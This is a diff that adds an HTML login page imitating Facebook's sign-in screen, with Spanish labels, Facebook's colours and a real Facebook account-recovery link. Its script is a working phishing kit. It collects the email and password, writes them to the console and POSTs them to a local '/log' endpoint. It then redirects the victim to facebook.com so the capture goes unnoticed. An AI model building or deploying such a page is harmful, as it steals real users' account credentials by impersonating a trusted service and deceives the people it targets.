@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
+    <title> Login </title>
+    <style>
+        * {
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: #f0f2f5;
+            padding: 1em;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        #loginForm {
+            background-color: #fff;
+            border: 1px solid #dce1e5;
+            border-radius: 10px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 3px 8px rgba(0, 0, 0, 0.24);
+            display: inline-block;
+            padding: 3em;
+        }
+
+        #loginForm input[type="submit"] {
+            background-color: #4267b2;
+            border: none;
+            border-radius: 3px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            padding: .5em;
+            margin: .1em 0;
+        }
+
+        #loginForm input[type="submit"]:hover {
+            background-color: #3b5998;
+        }
+        input[type="text"],
+        input[type="password"] {
+            font-size: 1.22em;
+            width: 100%;
+            margin: .5em 0;
+            padding: .5em;
+        }
+        a {
+            text-align: center;
+            display: block;
+            margin: .1em 0;
+        }
+    </style>
+</head>
+
+<body>
+    <form id="loginForm">
+        <img src="/letras.svg" alt="">
+        <h3>Iniciar sesión en Facebook</h3>
+        <hr>
+        <input type="text" id="email" name="email" placeholder="correo"><br>
+        
+        <input type="password" id="password" name="password" placeholder="contraseña"><br><br>
+        <hr>
+        <input type="submit" value="Iniciar sesión">
+        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"> ¿Olvidaste tu cuenta? </a>
+
+    </form>
+
+    <script>
+        const loginForm = document.getElementById("loginForm");
+
+        loginForm.addEventListener("submit", async (e) => {
+            e.preventDefault();
+
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            console.log( email );
+            console.log( password );
+            if (!email || !password) {
+                alert("Por favor ingresa tu correo electrónico y contraseña.");
+                return;
+            }
+            const body = {
+                correo: email,
+                pass: password
+            }
+            
+            const resp = await fetch('/log', {
+                method: 'POST',
+                body: JSON.stringify(body),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            });
+            const data = await resp.json();
+
+            location.href = 'https://facebook.com'
+
+            // Aquí puedes enviar la información de inicio de sesión a tu servidor para verificarla
+            // y iniciar sesión en la cuenta de Facebook del usuario.
+        });
+    </script>
+</body>
+
+</html>
